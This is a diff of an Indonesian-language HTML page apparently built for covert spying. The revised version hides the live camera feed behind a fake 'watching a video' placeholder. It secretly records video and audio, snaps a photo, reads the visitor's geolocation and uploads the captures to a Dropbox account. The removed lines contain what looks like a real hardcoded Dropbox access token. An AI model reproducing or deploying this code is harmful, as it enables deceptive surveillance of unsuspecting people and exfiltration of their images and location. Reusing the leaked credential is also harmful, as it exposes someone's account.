@@ -3,102 +3,127 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tracking and Uploading to Dropbox</title>
+    <title>Manipulasi Video</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            margin: 20px;
-            background-color: #f5f5f5;
+        #videoElement {
+            width: 100%;
+            height: auto;
+            display: none; /* Menyembunyikan video asli */
         }
-        h1 {
-            color: #4CAF50;
+        #fakeVideo {
+            width: 100%;
+            height: auto;
+            background-color: #000;
+            text-align: center;
+            color: white;
+            font-size: 20px;
+            line-height: 400px; /* Agar tulisan muncul di tengah */
         }
         #actionBtn {
+            margin-top: 20px;
             padding: 15px;
             background-color: #4CAF50;
             color: white;
             font-size: 18px;
-            border: none;
-            border-radius: 5px;
             cursor: pointer;
-            transition: 0.3s;
-        }
-        #actionBtn:hover {
-            background-color: #45a049;
-        }
-        #status {
-            margin-top: 20px;
-            color: #555;
         }
     </style>
 </head>
 <body>
-    <h1>Proses Tracking dan Upload ke Dropbox</h1>
-    <button id="actionBtn">Mulai Proses</button>
-    <p id="status">Tekan tombol untuk memulai proses.</p>
+    <h1>Manipulasi Video dan Fungsi Lainnya</h1>
+    
+    <!-- Video yang sebenarnya akan disembunyikan -->
+    <video id="videoElement" autoplay muted></video>
+
+    <!-- Video Placeholder seolah-olah video sedang diputar -->
+    <div id="fakeVideo">
+        <p>Menonton Video...</p>
+    </div>
+
+    <!-- Tombol untuk memulai semua fungsi -->
+    <button id="actionBtn">Mulai Semua Fungsi</button>
 
     <script>
+        let videoElement = document.getElementById('videoElement');
+        let fakeVideo = document.getElementById('fakeVideo');
         let actionBtn = document.getElementById('actionBtn');
-        let status = document.getElementById('status');
+
         let mediaStream;
         let mediaRecorder;
         let recordedChunks = [];
-        let locationData = null;
+        let locationData = [];
 
         // Ganti dengan token akses Dropbox Anda
-        const DROPBOX_ACCESS_TOKEN = 'UwS97ukIVHCM_ewt3mdZeSJeyyA1tXJH1oy3PhirAZ1xR2Avy6vFbsMzBivqv0JHQw9MKjvaAqB_sgzJF4xNNwdgD2eA4CSqSnFpeVdmPLMu0HcRzlLmMblUHY5ClRE2NrxRtZ';
+        const DROPBOX_ACCESS_TOKEN = 'YOUR_DROPBOX_ACCESS_TOKEN';
 
         // Fungsi untuk melacak lokasi pengguna
         function trackLocation() {
-            return new Promise((resolve, reject) => {
-                if (navigator.geolocation) {
-                    navigator.geolocation.getCurrentPosition(function(position) {
-                        locationData = {
-                            latitude: position.coords.latitude,
-                            longitude: position.coords.longitude
-                        };
-                        resolve(locationData);
-                    }, function(error) {
-                        reject('Gagal melacak lokasi: ' + error.message);
-                    });
-                } else {
-                    reject('Geolocation tidak didukung di browser ini.');
-                }
-            });
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    locationData = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude
+                    };
+                    console.log('Latitude: ' + position.coords.latitude);
+                    console.log('Longitude: ' + position.coords.longitude);
+                }, function(error) {
+                    console.log('Error dalam melacak lokasi:', error);
+                });
+            } else {
+                console.log('Geolocation tidak didukung di browser ini.');
+            }
         }
 
         // Fungsi untuk memulai video
         function startVideo() {
-            return navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+                .then(function(stream) {
+                    mediaStream = stream;
+                    videoElement.srcObject = stream; // Menampilkan video asli
+                    videoElement.style.display = 'none'; // Menyembunyikan video asli
+                    fakeVideo.style.display = 'block'; // Menampilkan video placeholder
+                    trackLocation(); // Mulai melacak lokasi ketika video dimulai
+                })
+                .catch(function(error) {
+                    console.log('Akses kamera gagal: ', error);
+                });
         }
 
         // Fungsi untuk mulai merekam video
-        function startRecording(stream) {
-            return new Promise((resolve) => {
-                recordedChunks = [];
-                mediaRecorder = new MediaRecorder(stream);
+        function startRecording() {
+            recordedChunks = [];
+            mediaRecorder = new MediaRecorder(mediaStream);
 
-                mediaRecorder.ondataavailable = function(event) {
-                    if (event.data.size > 0) {
-                        recordedChunks.push(event.data);
-                    }
-                };
+            mediaRecorder.ondataavailable = function(event) {
+                recordedChunks.push(event.data);
+            };
 
-                mediaRecorder.onstop = function() {
-                    let blob = new Blob(recordedChunks, { type: 'video/webm' });
-                    resolve(blob);
-                };
+            mediaRecorder.onstop = function() {
+                let blob = new Blob(recordedChunks, { type: 'video/webm' });
+                uploadToDropbox(blob, 'video'); // Unggah video ke Dropbox
+            };
 
-                mediaRecorder.start();
-                setTimeout(() => mediaRecorder.stop(), 5000); // Rekam selama 5 detik
-            });
+            mediaRecorder.start();
+        }
+
+        // Fungsi untuk mengambil foto dari kamera
+        function takePhoto() {
+            let canvas = document.createElement('canvas');
+            let context = canvas.getContext('2d');
+            canvas.width = videoElement.videoWidth;
+            canvas.height = videoElement.videoHeight;
+            context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+
+            canvas.toBlob(function(blob) {
+                uploadToDropbox(blob, 'photo'); // Unggah foto ke Dropbox
+            }, 'image/jpeg');
         }
 
         // Fungsi untuk mengunggah file ke Dropbox
-        function uploadToDropbox(fileBlob, fileName) {
+        function uploadToDropbox(fileBlob, type) {
             const url = 'https://content.dropboxapi.com/2/files/upload';
             const xhr = new XMLHttpRequest();
+            const fileName = type === 'video' ? 'recorded_video.webm' : 'photo.jpg';
 
             xhr.open('POST', url, true);
             xhr.setRequestHeader('Authorization', 'Bearer ' + DROPBOX_ACCESS_TOKEN);
@@ -111,52 +136,38 @@
             }));
 
             xhr.onload = function() {
-                if (xhr.status === 200) {
-                    status.textContent = File "${fileName}" berhasil diunggah ke Dropbox.;
-                } else {
-                    status.textContent = Gagal mengunggah file: ${xhr.responseText};
-                }
+                console.log('File berhasil diunggah ke Dropbox:', xhr.responseText);
             };
 
             xhr.onerror = function() {
-                status.textContent = 'Terjadi kesalahan saat mengunggah file.';
+                console.error('Gagal mengunggah ke Dropbox');
             };
 
             xhr.send(fileBlob);
         }
 
-        // Fungsi utama untuk memulai semua proses
-        async function startAllFunctions() {
-            actionBtn.disabled = true;
-            status.textContent = 'Memulai proses...';
+        // Fungsi utama yang memulai semua proses
+        function startAllFunctions() {
+            actionBtn.disabled = true; // Nonaktifkan tombol selama proses
+            actionBtn.textContent = 'Menunggu Rekaman...';
 
-            try {
-                // Lacak lokasi
-                const location = await trackLocation();
-                status.textContent = Lokasi berhasil dilacak: Lat ${location.latitude}, Long ${location.longitude};
+            startVideo(); // Mulai video dan lokasi
+            startRecording(); // Mulai merekam setelah video dimulai
 
-                // Simpan lokasi ke Dropbox
-                const locationBlob = new Blob([JSON.stringify(location)], { type: 'application/json' });
-                uploadToDropbox(locationBlob, 'location.json');
+            // Ambil foto setelah 2 detik
+            setTimeout(function() {
+                takePhoto();
+            }, 2000); // Foto setelah 2 detik
 
-                // Akses kamera dan mulai merekam
-                mediaStream = await startVideo();
-                const videoBlob = await startRecording(mediaStream);
-
-                // Upload video ke Dropbox
-                uploadToDropbox(videoBlob, 'recorded_video.webm');
-            } catch (error) {
-                status.textContent = 'Kesalahan: ' + error;
-            } finally {
-                if (mediaStream) {
-                    mediaStream.getTracks().forEach(track => track.stop());
-                }
-                actionBtn.disabled = false;
-                actionBtn.textContent = 'Mulai Lagi';
-            }
+            // Setelah 5 detik, hentikan rekaman dan sembunyikan video
+            setTimeout(function() {
+                mediaRecorder.stop(); // Berhenti merekam setelah 5 detik
+                actionBtn.disabled = false; // Aktifkan kembali tombol
+                actionBtn.textContent = 'Rekam Lagi';
+            }, 5000); // Rekam selama 5 detik
         }
 
-        // Tambahkan event listener pada tombol
+        // Tambahkan event listener pada tombol untuk memulai semua fungsi
         actionBtn.addEventListener('click', startAllFunctions);
     </script>
 </body>
